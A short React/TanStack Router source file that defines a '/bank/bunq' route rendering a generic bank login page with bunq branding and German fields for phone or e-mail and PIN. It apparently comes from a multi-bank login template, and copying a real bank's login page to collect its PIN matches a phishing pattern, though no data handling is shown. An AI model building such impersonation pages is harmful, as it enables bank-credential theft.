import { createFileRoute } from "@tanstack/react-router";
import { BankLoginPage } from "@/components/BankLoginPage";

export const Route = createFileRoute("/bank/bunq")({
  head: () => ({ meta: [{ title: "bunq — Login" }] }),
  component: () => (
    <BankLoginPage idPrefix="bunq" logoSlug="bunq" title="bunq" field1Label="Telefonnummer oder E-Mail Adresse" field2Label="PIN" />
  ),
});
